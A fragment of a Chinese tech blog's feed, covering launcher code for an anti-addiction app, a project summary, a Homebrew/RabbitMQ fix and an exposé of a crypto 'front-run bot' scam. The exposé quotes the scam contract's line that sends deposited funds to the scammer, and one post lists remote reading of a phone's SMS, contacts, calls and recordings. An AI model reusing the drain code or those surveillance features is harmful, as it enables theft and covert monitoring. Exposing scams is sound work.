ArrayList&lt;String&gt; hiddenList = AppSettings.get().getHiddenAppsList();</span><br><span class="line">        if(HomeActivity._db == null )return;</span><br><span class="line"></span><br><span class="line">        // 根据pkg找到app</span><br><span class="line">        List&lt;App&gt;  apps =  AppManager.getInstance(AppObject.get()).getNonFilteredApps();</span><br><span class="line">        App findApp = null;</span><br><span class="line">        for (App app : apps) &#123;</span><br><span class="line">            if (app.getComponentName().contains(pkg)) &#123;</span><br><span class="line">                findApp = app;</span><br><span class="line">                // 构造Intent string</span><br><span class="line">                HomeActivity._db.deleteItemByIntent(Tool.getIntentAsString(Tool.getIntentFromApp(findApp)));</span><br><span class="line">                Log.d(&quot;DeskTopUtils&quot;,&quot;remove find match local app &quot;+ findApp.getComponentName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if( findApp == null ) &#123;</span><br><span class="line">            Log.d(&quot;DeskTopUtils&quot;,&quot;removeFromDesk can&#x27;t find match local app &quot;+ pkg);</span><br><span class="line">            return;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Log.d(&quot;DeskTopUtils&quot;,&quot;removeFromDesk find match local app &quot;+ findApp.getComponentName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 生成坐标</span><br><span class="line">    private static String genCoordinate(List&lt;List&lt;Item&gt;&gt; itemLists )&#123;</span><br><span class="line">        String coordinateStr =  &quot;&quot;;</span><br><span class="line">        for (int pageCount = 0; pageCount &lt; itemLists.size(); pageCount++) &#123;</span><br><span class="line">            List&lt;Item&gt; page = itemLists.get(pageCount);</span><br><span class="line">            for (int j = 0; j &lt; page.size(); j++) &#123;</span><br><span class="line">                coordinateStr += &quot;(&quot;+pageCount +&quot;,&quot; + page.get(j)._x+&quot;,&quot;+page.get(j)._y+&quot;);&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return coordinateStr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 从hide移除，并从desktop中选择合适位置，添加进去</span><br><span class="line">    public static void addToDesk(String pkg) &#123;</span><br><span class="line">        // hide 更新</span><br><span class="line">        ArrayList&lt;String&gt; hiddenList = AppSettings.get().getHiddenAppsList();</span><br><span class="line">        if(HomeActivity._db == null )return;</span><br><span class="line"></span><br><span class="line">        // 根据pkg找到app</span><br><span class="line">        List&lt;App&gt;  apps =  AppManager.getInstance(AppObject.get()).getNonFilteredApps();</span><br><span class="line">        App findApp = null;</span><br><span class="line">        for (App app : apps) &#123;</span><br><span class="line">            if (app.getComponentName().contains(pkg)) &#123;</span><br><span class="line">                findApp = app;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if( findApp == null ) &#123;</span><br><span class="line">            Log.d(&quot;DeskTopUtils&quot;,&quot;addToDesk can&#x27;t find match local app &quot;+ pkg);</span><br><span class="line">            return;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Log.d(&quot;DeskTopUtils&quot;,&quot;addToDesk find match local app &quot;+ findApp.getComponentName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 数据库更新</span><br><span class="line">        List&lt;CellContainer&gt; _pages = new ArrayList&lt;&gt;();</span><br><span class="line">        List&lt;List&lt;Item&gt;&gt; desktopItems = HomeActivity._db.getDesktop();</span><br><span class="line"></span><br><span class="line">        String deskGrid = genCoordinate(desktopItems);</span><br><span class="line">        int row = AppSettings.get().getDesktopRowCount();</span><br><span class="line">        int col = AppSettings.get().getDesktopColumnCount();</span><br><span class="line"></span><br><span class="line">        // 查找每一个page中的合适位置</span><br><span class="line">        String t_point = &quot;&quot;;</span><br><span class="line">        int find_x = 0;</span><br><span class="line">        int find_y = 0;</span><br><span class="line">        boolean find = false;</span><br><span class="line"></span><br><span class="line">        // 倒序，刚容易找到位置，先这样</span><br><span class="line">        for (int pageCount = 0; pageCount &lt; desktopItems.size(); pageCount++) &#123;</span><br><span class="line">            List&lt;Item&gt; page = desktopItems.get(pageCount);</span><br><span class="line">            // 如果倒序，刚容易找到位置，先这样;取舍：这样可以在添加的时候，优先使用最前面的空缺位置</span><br><span class="line">            for( int j=0;j&lt;page.size();j++) &#123;</span><br><span class="line">                //尝试在每一个元素周边寻找区域</span><br><span class="line">                Item t_item = page.get(j);</span><br><span class="line">                int t_x = t_item._x;</span><br><span class="line">                int t_y = t_item._y;</span><br><span class="line">                // 右边</span><br><span class="line">                int tx_top = t_x-1;</span><br><span class="line">                if( tx_top &gt;=0 ) &#123;</span><br><span class="line">                    t_point = &quot;(&quot; +pageCount+&quot;,&quot;+tx_top+&quot;,&quot;+t_y+&quot;)&quot;;</span><br><span class="line">                    if( !deskGrid.contains( t_point ) ) &#123;</span><br><span class="line">                        find_x = tx_top;</span><br><span class="line">                        find_y = t_y;</span><br><span class="line">                        find = true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // 左边</span><br><span class="line">                tx_top = t_x +1;</span><br><span class="line">                if( tx_top &gt;=0 &amp;&amp; tx_top &lt; col )&#123;</span><br><span class="line">                    t_point = &quot;(&quot;+pageCount+&quot;,&quot;+tx_top+&quot;,&quot;+t_y+&quot;)&quot;;</span><br><span class="line">                    if( !deskGrid.contains( t_point ) ) &#123;</span><br><span class="line">                        find_x = tx_top;</span><br><span class="line">                        find_y = t_y;</span><br><span class="line">                        find = true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // 上边</span><br><span class="line">                int ty_top = t_y -1;</span><br><span class="line">                if( ty_top &gt;=0 )&#123;</span><br><span class="line">                    t_point = &quot;(&quot;+pageCount+&quot;,&quot;+t_x+&quot;,&quot;+ty_top+&quot;)&quot;;</span><br><span class="line">                    if( !deskGrid.contains( t_point ) ) &#123;</span><br><span class="line">                        find_x  = t_x;</span><br><span class="line">                        find_y = ty_top;</span><br><span class="line">                        find = true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // 下边</span><br><span class="line">                ty_top = t_y + 1;</span><br><span class="line">                if( ty_top &gt;=0 &amp;&amp; ty_top &lt; row)&#123;</span><br><span class="line">                    t_point = &quot;(&quot;+pageCount+&quot;,&quot;+t_x+&quot;,&quot;+ty_top+&quot;)&quot;;</span><br><span class="line">                    if( !deskGrid.contains( t_point ) ) &#123;</span><br><span class="line">                        find_x  = t_x;</span><br><span class="line">                        find_y = ty_top;</span><br><span class="line">                        find = true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Item newItem = Item.newAppItem(findApp);</span><br><span class="line">            newItem._spanY = 1;</span><br><span class="line">            newItem._spanX = 1;</span><br><span class="line">            if( find ) &#123;</span><br><span class="line">                newItem._x = find_x;</span><br><span class="line">                newItem._y = find_y;</span><br><span class="line">                HomeActivity._db.saveItem(newItem, pageCount, Definitions.ItemPosition.Desktop);</span><br><span class="line">                Log.d(&quot;DeskTopUtils&quot;,&quot;addToDesk find location to locate app  page,x,y=&quot;+pageCount +&quot;,&quot; +find_x+&quot;,&quot;+ find_y +&quot;，package=&quot;+Tool.getIntentAsString(newItem._intent));</span><br><span class="line">                break;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 新建一个页面，放置app</span><br><span class="line">                if ( pageCount == desktopItems.size()-1 ) &#123;</span><br><span class="line">                    int newPage = pageCount + 1;</span><br><span class="line">                    newItem._x = 0;</span><br><span class="line">                    newItem._y = 0;</span><br><span class="line">                    HomeActivity._db.saveItem(newItem, newPage, Definitions.ItemPosition.Desktop);</span><br><span class="line">                    Log.d(&quot;DeskTopUtils&quot;, &quot;addToDesk no location , new page ,  page,x,y=&quot; + newPage + &quot;,&quot; + find_x + &quot;,&quot; + find_y + &quot;，package=&quot; + Tool.getIntentAsString(newItem._intent));</span><br><span class="line">                    break;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    Log.d(&quot;DeskTopUtils&quot;, &quot;addToDesk no location , query new page try&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;防沉迷项目总结（2）&quot;&gt;&lt;a href=&quot;#防沉迷项目总结（2）&quot; class=&quot;headerlink&quot; title=&quot;防沉迷项目总结（2）&quot;&gt;&lt;/a&gt;防沉迷项目总结（2）&lt;/h1&gt;&lt;h2 id=&quot;软件开发的需求变动问题&quot;&gt;&lt;a href=&quot;#软件开发的需求变动问</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - 项目总结" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="技术" scheme="https://www.memestarter.top/tags/%E6%8A%80%E6%9C%AF/"/>
    
    <category term="算法" scheme="https://www.memestarter.top/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="项目总结" scheme="https://www.memestarter.top/tags/%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>防沉迷app-项目总结1</title>
    <link href="https://www.memestarter.top/2022/04/26/%E9%98%B2%E6%B2%89%E8%BF%B7app-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%931/"/>
    <id>https://www.memestarter.top/2022/04/26/%E9%98%B2%E6%B2%89%E8%BF%B7app-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%931/</id>
    <published>2022-04-26T02:10:04.000Z</published>
    <updated>2022-04-26T02:51:00.740Z</updated>
    
    <content type="html"><![CDATA[<h1 id="防沉迷项目总结（1）"><a href="#防沉迷项目总结（1）" class="headerlink" title="防沉迷项目总结（1）"></a>防沉迷项目总结（1）</h1><h2 id="防沉迷介绍"><a href="#防沉迷介绍" class="headerlink" title="防沉迷介绍"></a>防沉迷介绍</h2><p>现代社会，手机成了个人的计算中心，各种人与人、人与物的连接，都通过手机连接到每一个个体，极大的方便了人们的生活、学习、工作和娱乐。然而正是这样的便捷性，高度依赖性，使人们越来越离不开手机，很多人深陷其中，不能自拔，甚至严重影响正常的休息、生活、学习、工作和交流，越来越考验人的自律能力。因此很多人需要适当的提醒、干预或者强制的方式来摆脱这种状况。“防沉迷APP”的想法被创业者发现并实施。</p><p>作为一款手机防沉迷软件，该软件在解救两亿手机控、低头族，让她成为学生、考生、家长、低头族、手机控、战拖们的必备应用。</p><p>目前知名的国内防沉迷app有：格雷盒子，青柠守护，阳光守护等</p><h2 id="防沉迷技术难点"><a href="#防沉迷技术难点" class="headerlink" title="防沉迷技术难点"></a>防沉迷技术难点</h2><h3 id="设置默认桌面"><a href="#设置默认桌面" class="headerlink" title="设置默认桌面"></a>设置默认桌面</h3><p>目前已知问题，小米桌面如果没有经过官方的认证，就不让设置其他第三方桌面（launcher）设置为默认桌面。小米这么做也有道理。因为第三方桌面有可能会做一些伤害用户体验的行为。有官方的背书，能在一定程度上避免这个问题。同样的问题还在华为手机上出现。华为手机直接是不让设置默认桌面，根本没有这个选项。</p><h3 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h3><p>防沉迷，最重要的是让用户在使用手机的时候，只能操作某一类或者某一些app。这里问题就来了，怎么做到呢？第一想到的就是设置默认桌面，同时隐藏设置桌面的配置。但是上面说了，目前主流手机厂商对这方面有着自己的顾虑和思考。<br>那没有没有可能在不支持的手机上支持用户app开机启动，同时只允许打开自己的app，不允许切换到其他app，达到类似launcher（桌面）的效果呢？<br>答案是肯定的。</p><h3 id="手机兼容性"><a href="#手机兼容性" class="headerlink" title="手机兼容性"></a>手机兼容性</h3><p>安卓手机厂商众多，各种改。而防沉迷用到的api又比较底层，兼容性是一个让开发者头疼的问题。</p><h3 id="屏蔽其他app"><a href="#屏蔽其他app" class="headerlink" title="屏蔽其他app"></a>屏蔽其他app</h3><p>屏蔽有2个思路</p><ol><li>控制launcher，隐藏app的icon图标。这个没啥好说的</li><li>类似如下这个效果。只要用户点击任何其他app都提示，app被禁止</li></ol><p><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220426102755.png" alt="20220426102755"></p><h3 id="权限自动点击"><a href="#权限自动点击" class="headerlink" title="权限自动点击"></a>权限自动点击</h3><p>由于需要比较多的权限，不同手机的设置路径也不尽相同。如果能实现自动点击，自动选择，无疑会给用户很大的帮助。</p><h3 id="手机远程控制"><a href="#手机远程控制" class="headerlink" title="手机远程控制"></a>手机远程控制</h3><h4 id="远程获取通讯录"><a href="#远程获取通讯录" class="headerlink" title="远程获取通讯录"></a>远程获取通讯录</h4><h4 id="远程读取用户手机短信"><a href="#远程读取用户手机短信" class="headerlink" title="远程读取用户手机短信"></a>远程读取用户手机短信</h4><h4 id="远程读取用户通话记录"><a href="#远程读取用户通话记录" class="headerlink" title="远程读取用户通话记录"></a>远程读取用户通话记录</h4><h4 id="远程获取用户手机截屏"><a href="#远程获取用户手机截屏" class="headerlink" title="远程获取用户手机截屏"></a>远程获取用户手机截屏</h4><h4 id="远程录制用户手机屏幕"><a href="#远程录制用户手机屏幕" class="headerlink" title="远程录制用户手机屏幕"></a>远程录制用户手机屏幕</h4><h4 id="远程锁定被控制手机"><a href="#远程锁定被控制手机" class="headerlink" title="远程锁定被控制手机"></a>远程锁定被控制手机</h4><h4 id="远程控制被控手机app删除或者增加"><a href="#远程控制被控手机app删除或者增加" class="headerlink" title="远程控制被控手机app删除或者增加"></a>远程控制被控手机app删除或者增加</h4><h4 id="远程控制被控手机app打开或者关闭"><a href="#远程控制被控手机app打开或者关闭" class="headerlink" title="远程控制被控手机app打开或者关闭"></a>远程控制被控手机app打开或者关闭</h4><h4 id="远程控制被控手机录音"><a href="#远程控制被控手机录音" class="headerlink" title="远程控制被控手机录音"></a>远程控制被控手机录音</h4><h4 id="远程控制被控手机活动范围，设定电子围栏，超出范围提醒"><a href="#远程控制被控手机活动范围，设定电子围栏，超出范围提醒" class="headerlink" title="远程控制被控手机活动范围，设定电子围栏，超出范围提醒"></a>远程控制被控手机活动范围，设定电子围栏，超出范围提醒</h4><h2 id="防沉迷app思考和拓展"><a href="#防沉迷app思考和拓展" class="headerlink" title="防沉迷app思考和拓展"></a>防沉迷app思考和拓展</h2><p>后话：做防沉迷这段时间，确实发现这个市场还挺大的。我们做的方向是，类似阳光守护那种。有两个端：家长端和孩子端。<br>家长端：可以控制孩子的手机，包括获取孩子手机app，远程截屏，远程锁屏等。<br>孩子端：只可以打开被家长允许的app，只能在规定时间玩手机等</p><p>其实,有了这个技术，应用场景是很多的。从控制端和被控端来思考</p><ol><li><p>假设只有一个端</p><ul><li>可以做成一个防沉迷app单机版，解决学生等老离不开手机的问题，帮自己改掉习惯，投入学习</li><li>可以做成一个习惯训练app，设置一个社区，社区的人打卡比赛，谁能养成习惯给予奖励。</li></ul></li><li><p>有一个控制端和一个被控端</p><ul><li>家长控制孩子</li><li>老师控制学生</li><li>孩子给上了年纪的父母远程协助</li><li>其他场景</li></ul></li></ol><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>做了这么多，还有一些没解决问题。有意者可以联系 Q:2169564366 （备注：防沉迷）技术交流。一起成长</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;防沉迷项目总结（1）&quot;&gt;&lt;a href=&quot;#防沉迷项目总结（1）&quot; class=&quot;headerlink&quot; title=&quot;防沉迷项目总结（1）&quot;&gt;&lt;/a&gt;防沉迷项目总结（1）&lt;/h1&gt;&lt;h2 id=&quot;防沉迷介绍&quot;&gt;&lt;a href=&quot;#防沉迷介绍&quot; class=&quot;he</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - 项目总结" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="技术" scheme="https://www.memestarter.top/tags/%E6%8A%80%E6%9C%AF/"/>
    
    <category term="项目总结" scheme="https://www.memestarter.top/tags/%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>fix-mac-rabbitmq-issue</title>
    <link href="https://www.memestarter.top/2022/04/19/fix-mac-rabbitmq-issue/"/>
    <id>https://www.memestarter.top/2022/04/19/fix-mac-rabbitmq-issue/</id>
    <published>2022-04-19T12:27:21.000Z</published>
    <updated>2022-04-19T12:42:08.197Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>今天在mac 下面配置 rabbitmq的环境，按照官方文档 brew install rabbitmq 竟然报错了，如下。<br>核心错误 *** No formulae found in taps *** </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">yyy@xxx-MacBook-Pro ~ % brew install rabbitmq</span><br><span class="line"></span><br><span class="line">Running `brew update --preinstall`...</span><br><span class="line">fatal: Could not resolve HEAD to a revision</span><br><span class="line">==&gt; Tapping homebrew/cask</span><br><span class="line">Cloning into &#x27;/usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask&#x27;...</span><br><span class="line">remote: Enumerating objects: 633392, done.</span><br><span class="line">remote: Counting objects: 100% (14/14), done.</span><br><span class="line">remote: Compressing objects: 100% (14/14), done.</span><br><span class="line">remote: Total 633392 (delta 6), reused 2 (delta 0), pack-reused 633378</span><br><span class="line">Receiving objects: 100% (633392/633392), 298.02 MiB | 9.22 MiB/s, done.</span><br><span class="line">Resolving deltas: 100% (448299/448299), done.</span><br><span class="line">Updating files: 100% (4055/4055), done.</span><br><span class="line">Tapped 3996 casks (4,066 files, 318.3MB).</span><br><span class="line">Warning: No available formula with the name &quot;rabbitmq&quot;.</span><br><span class="line">==&gt; Searching for similarly named formulae...</span><br><span class="line">Error: No similarly named formulae found.</span><br><span class="line">==&gt; Searching for a previously deleted formula (in the last month)...</span><br><span class="line">Error: No previously deleted formula found.</span><br><span class="line">==&gt; Searching taps on GitHub...</span><br><span class="line">Error: No formulae found in taps.</span><br><span class="line">jim@zhangs-MacBook-Pro ~ % brew install rabbitmq</span><br><span class="line"></span><br><span class="line">Running `brew update --preinstall`...</span><br><span class="line">fatal: Could not resolve HEAD to a revision</span><br><span class="line">Warning: No available formula with the name &quot;rabbitmq&quot;.</span><br><span class="line">==&gt; Searching for similarly named formulae...</span><br><span class="line">Error: No similarly named formulae found.</span><br><span class="line">==&gt; Searching for a previously deleted formula (in the last month)...</span><br><span class="line">Error: No previously deleted formula found.</span><br><span class="line">==&gt; Searching taps on GitHub...</span><br><span class="line">Error: No formulae found in taps.</span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>经过一番思考和查阅发现可以这样解决</p><ul><li>定位到homebrew目录<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/Homebrew/Library/Taps/homebrew/</span><br></pre></td></tr></table></figure></li><li>然后rm -rf homebrew-core</li><li>重新git clone <a href="https://github.com/Homebrew/homebrew-core.git">https://github.com/Homebrew/homebrew-core.git</a></li><li>最后重新执行brew install</li></ul><h2 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h2><p>可能是安装brew的过程中由于网络原因或者其他原因导致homebrew安装出现问题</p><h2 id="rabbitmq-其他"><a href="#rabbitmq-其他" class="headerlink" title="rabbitmq 其他"></a>rabbitmq 其他</h2><ul><li>rabbitmq常用命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brew services info   rabbitmq</span><br><span class="line">brew services stop   rabbitmq</span><br><span class="line">brew services restart   rabbitmq</span><br><span class="line">brew services kill   rabbitmq</span><br></pre></td></tr></table></figure></li><li>Web界面管理RabbitMQ<br>默认是可以本地登录localhost:15672，用户名：guest；密码：guest；端口默认15672</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;/a&gt;问题描述&lt;/h2&gt;&lt;p&gt;今天在mac 下面配置 rabbitmq的环境，按照官方文档 brew install rabbitmq 竟然报错了，如下。</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - 后端技术" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="rabbmitmq" scheme="https://www.memestarter.top/tags/rabbmitmq/"/>
    
  </entry>
  
  <entry>
    <title>区块链骗局之夹子机器人</title>
    <link href="https://www.memestarter.top/2022/04/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%97%E5%B1%80%E4%B9%8B%E5%A4%B9%E5%AD%90%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    <id>https://www.memestarter.top/2022/04/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%97%E5%B1%80%E4%B9%8B%E5%A4%B9%E5%AD%90%E6%9C%BA%E5%99%A8%E4%BA%BA/</id>
    <published>2022-04-07T13:48:33.000Z</published>
    <updated>2022-05-28T14:55:15.429Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我一个很久没联系的朋友，今天突然找到我，让我帮忙看看代码；说是自己在网上看到了一个区块链套利机器人的代码，很赚钱。自己也不根据代码部署了，但是钱取不出来了，他也是比较谨慎，就投入了5000多块吧！折合BNB大概2个（bnb 按照430美元&#x2F;个）。让我帮看看。</p><ul><li>骗子视频地址：<a href="https://www.youtube.com/watch?v=3QrBQW4TOfI&amp;t=71s">https://www.youtube.com/watch?v=3QrBQW4TOfI&amp;t=71s</a></li><li>合约代码地址 :<a href="https://ghostbin.com/rVoQh/raw">https://ghostbin.com/rVoQh/raw</a></li></ul><p>起初，我打开视频，也没人为他被骗。从视频标题，tag，特别是评论，100多条评论，全是清一色说的类似：我投了1个BNB，几天就变成了10个了…..<br>我就犯嘀咕了，我们圈子都知道链上机器人太卷了，机器人都开始打架了，还能赚钱吗？难道这个牛人有啥高明的策略？直到看了1分钟视频才反应过来是骗局。</p><h2 id="骗术剖析"><a href="#骗术剖析" class="headerlink" title="骗术剖析"></a>骗术剖析</h2><p>骗子在YouTube上，视频竟然打着*** 夹子机器人｜三明治机器人｜薄饼机器人｜pancakeswap｜科学家机器人｜抢先交易｜量化交易｜自动收入10+BNB｜Pancakes Front run bot｜（最新版本）***  ，看来骗子很注意SEO ，懂得搜索引擎优化。</p><p>其实这个骗术很简单，如果懂得代码的话，绝对不会上当。不懂代码的人看起来只会绝对好高级啊！加上被赚钱的欲望冲昏了头脑。下面就简要分析一下这个骗术有多低级</p><h3 id="骗术分析"><a href="#骗术分析" class="headerlink" title="骗术分析"></a>骗术分析</h3><p>骗术大致过程是：用看起来免费的方式教别人部署夹子套利机器人，机器人会自动在pancake上捕获潜在的交易对。就这么空手套白狼的剧本。视频下发还给出了代码，合约地址，部署教程等资料。看起来没啥问题。但是看视频操作就不对了</p><ol><li><p>合约部署为何要更改注释中的钱包地址，这装模作样的，也许骗子这里也是思考了：如果这里写用户的地址，用户会更加放心。<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220407220216.png" alt="20220407220216"></p></li><li><p>部署完成合约之后，为何要往合约地址转钱？？？注意：<em><strong>这里转入多少就会被骗子转走多少</strong></em> </p></li><li><p>看看骗子的所谓夹子代码。（只能说是一对垃圾代码，除了注释掉的有用代码不足10句话），其中最有用的一句代码是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payable(manager.uniswapDepositAddress()).transfer(address(this).balance);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看到了吗？这个就是把合约中的钱转走的，其余的被注释掉的无用代码都是障眼法。</p></li></ol><p>下面的代码可能随时被骗子删除   ，我就粘贴了一份，切忌别去尝试哦！<br>   合约代码链接：<br><a href="https://ghostbin.com/rVoQh/raw">https://ghostbin.com/rVoQh/raw</a></p><p>备用链接：<br><a href="https://pastebin.com/raw/1kVN2Nj9">https://pastebin.com/raw/1kVN2Nj9</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span 